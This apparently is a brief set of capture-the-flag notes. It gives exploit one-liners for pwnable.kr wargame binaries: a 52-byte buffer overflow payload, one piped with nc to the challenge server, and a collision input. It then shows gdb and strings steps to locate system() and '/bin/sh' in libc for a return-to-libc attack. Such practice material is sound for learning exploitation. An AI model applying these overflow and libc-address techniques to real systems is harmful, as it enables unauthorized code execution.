# Example shell code

```bash
./bof `python -c "print 'A'*52+'\xbe\xba\xfe\xca'"`
(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | ./bof
(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000

./col `python -c "print '\xcc\xce\xc5\x06'+'\xc8\xce\xc5\x06'*4"`
```



# How to find system() and bin/sh

```bash
ldd ./target
shared_library 	/lib/i386-linux-gnu/libc.so.6

strings -tx [shared_library] | grep "bin/sh"
/bin/sh		0x15bb2b

gdb [shared_library]
print system
system		0x3adb0

p/x 0x15bb2b-0x3adb0
$2=0x120d7b

diff		0x120d7b

gdb target
r
print system
0xf7630db0

p/x 0xf7630db0 + 0x120d7b
0xf7751b2b

x/s 0xf7751b2b
"/bin/sh"
```